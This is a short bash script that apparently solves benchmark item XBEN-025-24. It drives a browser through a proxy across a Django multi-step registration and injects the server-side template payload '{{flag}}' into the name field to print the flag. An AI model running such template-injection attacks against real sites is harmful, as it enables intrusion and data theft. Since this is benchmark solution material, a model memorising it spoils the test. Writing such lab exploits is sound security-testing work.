#!/usr/bin/env bash
# XBEN-025-24 — SSTI in a multi-step Django registration. Proxy-mode twin. The
# name field is rendered as a template on the final step; `{{flag}}` resolves to
# the flag. The forms carry CSRF tokens, so the page is driven in a real browser
# through step1 -> step2 -> step3.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben025p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/accounts/register/step1/"
ab wait 'input[name=name]' >/dev/null 2>&1 || true
ab fill 'input[name=name]' '{{flag}}' >/dev/null
ab fill 'input[name=password]' 'Passw0rd!longenough' >/dev/null
ab click 'button[type=submit]' >/dev/null
ab wait --load networkidle >/dev/null 2>&1 || true
ab fill 'input[name=email]' 'poc@example.test' >/dev/null
ab click 'button[type=submit]' >/dev/null
ab wait --load networkidle >/dev/null 2>&1 || true
print_flag
